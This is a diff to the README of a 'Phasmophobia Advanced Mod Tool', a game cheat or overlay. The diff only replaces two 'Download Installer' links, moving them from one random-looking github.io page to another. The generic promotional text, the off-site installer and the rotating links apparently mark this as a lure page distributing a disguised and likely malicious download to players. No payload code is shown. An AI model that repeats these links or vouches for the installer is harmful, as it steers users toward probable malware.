@@ -2,7 +2,7 @@
 
 Welcome to the Phasmophobia Advanced Mod Tool, your essential companion for mastering ghost hunts. This tool enhances your gameplay with real-time detection, customizable overlays, and intelligent analysis to help you identify ghosts faster and more accurately. With its user-friendly interface and seamless integration, you'll elevate your Phasmophobia experience to new heights.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://yellowtaxisave.github.io/download-page/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://capitals-707-bringing.github.io/download-page/)
 
 ## Features
 
@@ -77,7 +77,7 @@ Here are answers to some frequently asked questions about the Phasmophobia Advan
 
 To get the Phasmophobia Advanced Mod Tool, visit the official download page and follow the instructions:
 
-[Download from official website](https://yellowtaxisave.github.io/download-page/)
+[Download from official website](https://capitals-707-bringing.github.io/download-page/)
 
 **Note**: Always download from the official source to ensure you have the latest and safest version.
 
